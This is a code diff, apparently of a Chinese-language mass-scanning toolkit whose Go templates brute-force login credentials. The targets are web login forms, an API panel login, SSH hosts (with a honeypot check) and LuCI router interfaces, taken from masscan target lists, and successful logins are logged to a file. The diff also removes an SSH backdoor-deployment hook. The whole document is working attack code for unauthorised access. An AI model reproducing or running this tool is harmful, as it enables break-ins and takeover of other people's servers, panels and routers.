@@ -41,7 +41,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
-	_ "net/http/pprof" // 引入pprof
+	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -54,24 +54,18 @@ import (
 )
 
 var completedCount int64
-var isMemoryThrottled int32 // 0 for false, 1 for true
+var isMemoryThrottled int32
 
 func memoryMonitor() {
 	var baselineMem uint64
 	var m runtime.MemStats
-
-	// Establish baseline after a short delay to allow initial allocations
 	time.Sleep(2 * time.Second)
 	runtime.ReadMemStats(&m)
 	baselineMem = m.Sys
-
-	// Set watermarks relative to the baseline
-	highWatermark := baselineMem + 200*1024*1024 // Baseline + 200MB
-	lowWatermark := baselineMem + 100*1024*1024  // Baseline + 100MB
-
+	highWatermark := baselineMem + 200*1024*1024
+	lowWatermark := baselineMem + 100*1024*1024
 	ticker := time.NewTicker(2 * time.Second)
 	defer ticker.Stop()
-
 	for range ticker.C {
 		runtime.ReadMemStats(&m)
 		if m.Sys >= highWatermark {
@@ -82,7 +76,6 @@ func memoryMonitor() {
 	}
 }
 
-// Worker function to process IPs from a channel
 func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []string, passwords []string) {
 	defer wg.Done()
 	for line := range tasks {
@@ -99,48 +92,37 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	} else {
 		ipPort = strings.TrimSpace(line)
 	}
-
 	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 {
-		return
-	}
-	ip := parts[0]
-	port := parts[1]
+	if len(parts) != 2 { return }
+	ip, port := parts[0], parts[1]
 
 	tr := &http.Transport{
 		DisableKeepAlives: true,
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 	}
-	httpClient := &http.Client{
-		Transport: tr,
-		Timeout:   10 * time.Second,
-	}
+	httpClient := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
 
 	for _, username := range usernames {
 		for _, password := range passwords {
 			var resp *http.Response
-			
-			// Try HTTP
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			checkUrlHttp := fmt.Sprintf("http://%s:%s/login", ip, port)
-			payloadHttp := fmt.Sprintf("username=%s&password=%s", username, password)
-			reqHttp, err := http.NewRequestWithContext(ctx, "POST", checkUrlHttp, strings.NewReader(payloadHttp))
+			checkURL := fmt.Sprintf("http://%s:%s/login", ip, port)
+			payload := fmt.Sprintf("username=%s&password=%s", username, password)
+			req, err := http.NewRequestWithContext(ctx, "POST", checkURL, strings.NewReader(payload))
 			if err == nil {
-				reqHttp.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-				resp, err = httpClient.Do(reqHttp)
+				req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+				resp, err = httpClient.Do(req)
 			}
 			cancel()
 
-			// Try HTTPS if HTTP fails
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
-				checkUrlHttps := fmt.Sprintf("https://%s:%s/login", ip, port)
-				payloadHttps := fmt.Sprintf("username=%s&password=%s", username, password)
-				reqHttps, err := http.NewRequestWithContext(ctx2, "POST", checkUrlHttps, strings.NewReader(payloadHttps))
+				checkURL = fmt.Sprintf("https://%s:%s/login", ip, port)
+				req, err = http.NewRequestWithContext(ctx2, "POST", checkURL, strings.NewReader(payload))
 				if err == nil {
-					reqHttps.Header.Add("Content-Type", "application/x-www-form-urlencoded")
-					resp, err = httpClient.Do(reqHttps)
+					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
+					resp, err = httpClient.Do(req)
 				}
 				cancel2()
 			}
@@ -171,13 +153,8 @@ func main() {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
 		os.Exit(1)
 	}
-	inputFile := os.Args[1]
-	outputFile := os.Args[2]
-
-	go func() {
-		http.ListenAndServe("localhost:6060", nil)
-	}()
-
+	inputFile, outputFile := os.Args[1], os.Args[2]
+	go func() { http.ListenAndServe("localhost:6060", nil) }()
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -185,50 +162,36 @@ func main() {
 		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
-
 	go memoryMonitor()
-
 	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
-	usernames := {user_list}
-	passwords := {pass_list}
-
-    if len(usernames) == 0 || len(passwords) == 0 {
-        fmt.Println("错误：用户名或密码列表为空。")
-        return
-    }
-
+	usernames, passwords := {user_list}, {pass_list}
+	if len(usernames) == 0 || len(passwords) == 0 {
+		fmt.Println("错误：用户名或密码列表为空。")
+		return
+	}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
-	
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
-
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
 		go worker(tasks, outFile, &wg, usernames, passwords)
 	}
-
 	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 {
-            time.Sleep(250 * time.Millisecond)
-        }
+		for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
 		line := strings.TrimSpace(scanner.Text())
-		if line != "" {
-			tasks <- line
-		}
+		if line != "" { tasks <- line }
 	}
-
 	close(tasks)
 	wg.Wait()
 }
@@ -295,46 +258,38 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	} else {
 		ipPort = strings.TrimSpace(line)
 	}
-
 	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 {
-		return
-	}
-	ip := parts[0]
-	port := parts[1]
+	if len(parts) != 2 { return }
+	ip, port := parts[0], parts[1]
 
 	tr := &http.Transport{
 		DisableKeepAlives: true,
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 	}
-	httpClient := &http.Client{
-		Transport: tr,
-		Timeout:   10 * time.Second,
-	}
+	httpClient := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
 
 	for _, username := range usernames {
 		for _, password := range passwords {
 			var resp *http.Response
 			data := map[string]string{"username": username, "password": password}
 			jsonPayload, _ := json.Marshal(data)
-
 			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-			checkUrlHttp := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
-			reqHttp, err := http.NewRequestWithContext(ctx, "POST", checkUrlHttp, strings.NewReader(string(jsonPayload)))
+			checkURL := fmt.Sprintf("http://%s:%s/api/v1/login", ip, port)
+			req, err := http.NewRequestWithContext(ctx, "POST", checkURL, strings.NewReader(string(jsonPayload)))
 			if err == nil {
-				reqHttp.Header.Set("Content-Type", "application/json")
-				resp, err = httpClient.Do(reqHttp)
+				req.Header.Set("Content-Type", "application/json")
+				resp, err = httpClient.Do(req)
 			}
 			cancel()
 
 			if err != nil {
 				if resp != nil { resp.Body.Close() }
 				ctx2, cancel2 := context.WithTimeout(context.Background(), 10*time.Second)
-				checkUrlHttps := fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
-				reqHttps, err := http.NewRequestWithContext(ctx2, "POST", checkUrlHttps, strings.NewReader(string(jsonPayload)))
+				checkURL = fmt.Sprintf("https://%s:%s/api/v1/login", ip, port)
+				req, err = http.NewRequestWithContext(ctx2, "POST", checkURL, strings.NewReader(string(jsonPayload)))
 				if err == nil {
-					reqHttps.Header.Set("Content-Type", "application/json")
-					resp, err = httpClient.Do(reqHttps)
+					req.Header.Set("Content-Type", "application/json")
+					resp, err = httpClient.Do(req)
 				}
 				cancel2()
 			}
@@ -365,13 +320,8 @@ func main() {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
 		os.Exit(1)
 	}
-	inputFile := os.Args[1]
-	outputFile := os.Args[2]
-
-	go func() {
-		http.ListenAndServe("localhost:6060", nil)
-	}()
-
+	inputFile, outputFile := os.Args[1], os.Args[2]
+	go func() { http.ListenAndServe("localhost:6060", nil) }()
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
 	go func() {
@@ -379,50 +329,36 @@ func main() {
 		fmt.Println("\\nGracefully shutting down...")
 		os.Exit(0)
 	}()
-    
     go memoryMonitor()
-
 	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
-	usernames := {user_list}
-	passwords := {pass_list}
-
+	usernames, passwords := {user_list}, {pass_list}
     if len(usernames) == 0 || len(passwords) == 0 {
         fmt.Println("错误：用户名或密码列表为空。")
         return
     }
-
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
-
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
-
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
 		go worker(tasks, outFile, &wg, usernames, passwords)
 	}
-
 	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 {
-            time.Sleep(250 * time.Millisecond)
-        }
+        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
 		line := strings.TrimSpace(scanner.Text())
-		if line != "" {
-			tasks <- line
-		}
+		if line != "" { tasks <- line }
 	}
-
 	close(tasks)
 	wg.Wait()
 }
@@ -433,8 +369,6 @@ XUI_GO_TEMPLATE_6 = '''package main
 import (
 	"bufio"
 	"fmt"
-	"net/http"
-	_ "net/http/pprof"
 	"net/url"
 	"os"
 	"os/signal"
@@ -444,7 +378,6 @@ import (
 	"sync/atomic"
 	"syscall"
 	"time"
-
 	"golang.org/x/crypto/ssh"
 )
 
@@ -487,14 +420,9 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 	} else {
 		ipPort = strings.TrimSpace(line)
 	}
-
 	parts := strings.Split(ipPort, ":")
-	if len(parts) != 2 {
-		return
-	}
-
-	ip := strings.TrimSpace(parts[0])
-	port := strings.TrimSpace(parts[1])
+	if len(parts) != 2 { return }
+	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
 
 	for _, username := range usernames {
 		for _, password := range passwords {
@@ -503,11 +431,8 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				defer client.Close()
 				if !isLikelyHoneypot(client) {
 					file.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
-					if ENABLE_BACKDOOR {
-						deployBackdoor(client, ip, port, username, password, CUSTOM_BACKDOOR_CMDS)
-					}
 				}
-				return // Found a valid credential, move to next IP
+				return
 			}
 		}
 	}
@@ -529,70 +454,52 @@ func isLikelyHoneypot(client *ssh.Client) bool {
 	session, err := client.NewSession()
 	if err != nil { return true }
 	defer session.Close()
-
 	err = session.RequestPty("xterm", 80, 40, ssh.TerminalModes{})
 	if err != nil { return true }
-
 	output, err := session.CombinedOutput("echo $((1+1))")
 	if err != nil { return true }
-
 	return strings.TrimSpace(string(output)) != "2"
 }
-
-var ENABLE_BACKDOOR = {enable_backdoor}
-var CUSTOM_BACKDOOR_CMDS = {custom_backdoor_cmds}
-
-func deployBackdoor(client *ssh.Client, ip, port, username, password string, cmds []string) {
-	// Backdoor deployment logic remains the same
-}
-// ... (helper functions for backdoor deployment like checkUnzip, installPackage, etc. remain the same)
 
 func main() {
 	if len(os.Args) < 3 {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
 		os.Exit(1)
 	}
-	inputFile := os.Args[1]
-	outputFile := os.Args[2]
-
+	inputFile, outputFile := os.Args[1], os.Args[2]
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-sigChan
+		fmt.Println("\\nGracefully shutting down...")
+		os.Exit(0)
+	}()
     go memoryMonitor()
-
 	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
-	usernames := {user_list}
-	passwords := {pass_list}
-
+	usernames, passwords := {user_list}, {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
-
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
-
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
 		go worker(tasks, outFile, &wg, usernames, passwords)
 	}
-
 	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 {
-            time.Sleep(250 * time.Millisecond)
-        }
+        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
 		line := strings.TrimSpace(scanner.Text())
-		if line != "" {
-			tasks <- line
-		}
+		if line != "" { tasks <- line }
 	}
-
 	close(tasks)
 	wg.Wait()
 }
@@ -610,10 +517,12 @@ import (
 	_ "net/http/pprof"
 	"net/url"
 	"os"
+	"os/signal"
 	"runtime"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 )
 
@@ -646,10 +555,7 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, paths []stri
 		DisableKeepAlives: true,
 		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
 	}
-	client := &http.Client{
-		Transport: tr,
-		Timeout:   10 * time.Second,
-	}
+	client := &http.Client{ Transport: tr, Timeout: 10 * time.Second }
 	for line := range tasks {
 		processIP(line, file, paths, client)
 		atomic.AddInt64(&completedCount, 1)
@@ -664,18 +570,14 @@ func processIP(line string, file *os.File, paths []string, client *http.Client) 
 	} else {
 		ipPort = strings.TrimSpace(line)
 	}
-
 	for _, path := range paths {
-		if tryBothProtocols(ipPort, path, client, file) {
-			break
-		}
+		if tryBothProtocols(ipPort, path, client, file) { break }
 	}
 }
 
 func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.File) bool {
 	cleanPath := strings.Trim(path, "/")
 	fullPath := cleanPath + "/api/utils/env"
-	
 	if success, _ := sendRequest(client, fmt.Sprintf("http://%s/%s", ipPort, fullPath)); success {
 		file.WriteString(fmt.Sprintf("http://%s?api=http://%s/%s\\n", ipPort, ipPort, cleanPath))
 		return true
@@ -691,16 +593,13 @@ func sendRequest(client *http.Client, fullURL string) (bool, error) {
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
 	req, err := http.NewRequestWithContext(ctx, "GET", fullURL, nil)
-	if err != nil {
-		return false, err
-	}
+	if err != nil { return false, err }
 	resp, err := client.Do(req)
 	if err != nil { 
         if resp != nil { resp.Body.Close() }
         return false, err 
     }
 	defer resp.Body.Close()
-
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, _ := io.ReadAll(resp.Body)
 		if strings.Contains(string(bodyBytes), `{"status":"success","data"`) {
@@ -715,46 +614,41 @@ func main() {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
 		os.Exit(1)
 	}
-	inputFile := os.Args[1]
-	outputFile := os.Args[2]
-
+	inputFile, outputFile := os.Args[1], os.Args[2]
+	go func() { http.ListenAndServe("localhost:6060", nil) }()
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-sigChan
+		fmt.Println("\\nGracefully shutting down...")
+		os.Exit(0)
+	}()
     go memoryMonitor()
-
 	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
-	paths := {pass_list} // Using pass_list as paths
-
+	paths := {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
-
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
-
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
 		go worker(tasks, outFile, &wg, paths)
 	}
-
 	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 {
-            time.Sleep(250 * time.Millisecond)
-        }
+        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
 		line := strings.TrimSpace(scanner.Text())
-		if line != "" {
-			tasks <- line
-		}
+		if line != "" { tasks <- line }
 	}
-
 	close(tasks)
 	wg.Wait()
 }
@@ -770,10 +664,12 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/signal"
 	"runtime"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 )
 
@@ -820,18 +716,17 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup, usernames []
 }
 
 func processIP(line string, file *os.File, usernames []string, passwords []string, client *http.Client) {
-	// ... (logic for determining targets from line)
 	targets := []string{}
 	trimmed := strings.TrimSpace(line)
 	if strings.HasPrefix(trimmed, "http") {
 		targets = append(targets, trimmed)
 	} else {
-		// ... logic to create http/https targets from ip:port
+		targets = append(targets, "http://"+trimmed, "https://"+trimmed)
 	}
 
 	for _, target := range targets {
-		// ... (logic to create finalURL, origin, referer)
-		u, _ := url.Parse(target)
+		u, err := url.Parse(target)
+		if err != nil { continue }
 		origin := u.Scheme + "://" + u.Host
 		referer := origin + "/"
 		for _, username := range usernames {
@@ -848,11 +743,12 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 func checkLogin(urlStr, username, password, origin, referer string, client *http.Client) bool {
 	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
 	defer cancel()
-	
 	payload := fmt.Sprintf("luci_username=%s&luci_password=%s", username, password)
 	req, err := http.NewRequestWithContext(ctx, "POST", urlStr, strings.NewReader(payload))
 	if err != nil { return false }
-	// ... (set headers)
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	req.Header.Set("Origin", origin)
+	req.Header.Set("Referer", referer)
 	
 	resp, err := client.Do(req)
 	if err != nil { 
@@ -860,7 +756,6 @@ func checkLogin(urlStr, username, password, origin, referer string, client *http
         return false 
     }
 	defer resp.Body.Close()
-
 	for _, c := range resp.Cookies() {
 		if c.Name == "sysauth_http" && c.Value != "" {
 			return true
@@ -874,47 +769,40 @@ func main() {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
 		os.Exit(1)
 	}
-	inputFile := os.Args[1]
-	outputFile := os.Args[2]
-
+	inputFile, outputFile := os.Args[1], os.Args[2]
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-sigChan
+		fmt.Println("\\nGracefully shutting down...")
+		os.Exit(0)
+	}()
     go memoryMonitor()
-
 	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
-	usernames := {user_list}
-	passwords := {pass_list}
-
+	usernames, passwords := {user_list}, {pass_list}
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
-
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
-
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
 		go worker(tasks, outFile, &wg, usernames, passwords)
 	}
-
 	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 {
-            time.Sleep(250 * time.Millisecond)
-        }
+        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
 		line := strings.TrimSpace(scanner.Text())
-		if line != "" {
-			tasks <- line
-		}
+		if line != "" { tasks <- line }
 	}
-
 	close(tasks)
 	wg.Wait()
 }
@@ -932,10 +820,12 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"os/signal"
 	"runtime"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 
 	"golang.org/x/net/proxy"
@@ -1104,50 +994,37 @@ func main() {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
 		os.Exit(1)
 	}
-	inputFile := os.Args[1]
-	outputFile := os.Args[2]
-
+	inputFile, outputFile := os.Args[1], os.Args[2]
     go memoryMonitor()
-
 	var err error
 	realIP, err = getPublicIP(testURL)
 	if err != nil {
 		realIP = "UNKNOWN"
 	}
-
 	proxies, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法打开代理文件: %v\\n", err)
 		return
 	}
 	defer proxies.Close()
-
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Printf("无法创建输出文件: %v\\n", err)
 		return
 	}
 	defer outFile.Close()
-
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
-
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
 		go worker(tasks, outFile, &wg)
 	}
-
 	scanner := bufio.NewScanner(proxies)
 	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 {
-            time.Sleep(250 * time.Millisecond)
-        }
+        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
 		proxyAddr := strings.TrimSpace(scanner.Text())
-		if proxyAddr != "" {
-			tasks <- proxyAddr
-		}
+		if proxyAddr != "" { tasks <- proxyAddr }
 	}
-
 	close(tasks)
 	wg.Wait()
 }
@@ -1165,10 +1042,12 @@ import (
 	"net"
 	"net/http"
 	"os"
+	"os/signal"
 	"runtime"
 	"strings"
 	"sync"
 	"sync/atomic"
+	"syscall"
 	"time"
 )
 
@@ -1226,16 +1105,12 @@ func worker(tasks <-chan string, file *os.File, wg *sync.WaitGroup) {
 
 func processIP(ipPort string, file *os.File, httpClient *http.Client) {
 	parts := strings.SplitN(ipPort, ":", 2)
-	if len(parts) != 2 {
-		return
-	}
-	ip := strings.TrimSpace(parts[0])
-	port := strings.TrimSpace(parts[1])
+	if len(parts) != 2 { return }
+	ip, port := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1])
 
 	for _, proto := range []string{"http", "https"} {
 		base := fmt.Sprintf("%s://%s:%s", proto, ip, port)
 		testURL := base + "/api/me"
-
 		ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
 		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
 		if err != nil {
@@ -1244,10 +1119,8 @@ func processIP(ipPort string, file *os.File, httpClient *http.Client) {
 		}
 		req.Header.Set("User-Agent", "Mozilla/5.0")
 		req.Header.Set("Connection", "close")
-		
 		resp, err := httpClient.Do(req)
 		cancel()
-
 		if err == nil && isValidResponse(resp) {
 			file.WriteString(base + "\\n")
 			return
@@ -1256,19 +1129,12 @@ func processIP(ipPort string, file *os.File, httpClient *http.Client) {
 }
 
 func isValidResponse(resp *http.Response) bool {
-	if resp == nil {
-		return false
-	}
+	if resp == nil { return false }
 	defer resp.Body.Close()
-
 	body, err := io.ReadAll(io.LimitReader(resp.Body, 256*1024))
-	if err != nil {
-		return false
-	}
+	if err != nil { return false }
 	var data map[string]interface{}
-	if err := json.Unmarshal(body, &data); err != nil {
-		return false
-	}
+	if err := json.Unmarshal(body, &data); err != nil { return false }
 	if v, ok := data["code"]; ok {
 		switch t := v.(type) {
 		case float64:
@@ -1285,38 +1151,36 @@ func main() {
 		fmt.Println("Usage: ./program <inputFile> <outputFile>")
 		os.Exit(1)
 	}
-	inputFile := os.Args[1]
-	outputFile := os.Args[2]
-
+	inputFile, outputFile := os.Args[1], os.Args[2]
+	sigChan := make(chan os.Signal, 1)
+	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
+	go func() {
+		<-sigChan
+		fmt.Println("\\nGracefully shutting down...")
+		os.Exit(0)
+	}()
     go memoryMonitor()
-
 	batch, err := os.Open(inputFile)
 	if err != nil {
 		fmt.Printf("无法读取输入文件: %v\\n", err)
 		return
 	}
 	defer batch.Close()
-
 	outFile, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		fmt.Println("无法打开输出文件:", err)
 		return
 	}
 	defer outFile.Close()
-
 	tasks := make(chan string, {semaphore_size})
 	var wg sync.WaitGroup
-
 	for i := 0; i < {semaphore_size}; i++ {
 		wg.Add(1)
 		go worker(tasks, outFile, &wg)
 	}
-
 	scanner := bufio.NewScanner(batch)
 	for scanner.Scan() {
-        for atomic.LoadInt32(&isMemoryThrottled) == 1 {
-            time.Sleep(250 * time.Millisecond)
-        }
+        for atomic.LoadInt32(&isMemoryThrottled) == 1 { time.Sleep(250 * time.Millisecond) }
 		line := strings.TrimSpace(scanner.Text())
 		if line != "" {
 			fields := strings.Fields(line)
@@ -1325,7 +1189,6 @@ func main() {
 			}
 		}
 	}
-
 	close(tasks)
 	wg.Wait()
 }
@@ -2354,13 +2217,10 @@ if __name__ == "__main__":
                 lines_per_file = input_with_default("每个小文件行数", 5000)
                 sleep_seconds = input_with_default("爆破完休息秒数", 2)
                 
-                # ==================== DYNAMIC THREAD COUNT ====================
                 total_memory_mb = psutil.virtual_memory().total / 1024 / 1024
-                # 假设每个线程平均消耗 2.5MB 内存，并保留30%的系统内存
                 recommended_threads = int((total_memory_mb * 0.7) / 2.5)
-                if recommended_threads < 50: recommended_threads = 50 # 设置一个最小值
+                if recommended_threads < 50: recommended_threads = 50
                 params['semaphore_size'] = input_with_default(f"爆破线程数 (根据内存推荐 {recommended_threads})", recommended_threads)
-                # =============================================================
 
                 params['timeout'] = input_with_default("超时时间(秒)", 10)
                 masscan_rate = input_with_default("请输入Masscan扫描速率(pps)", 50000)
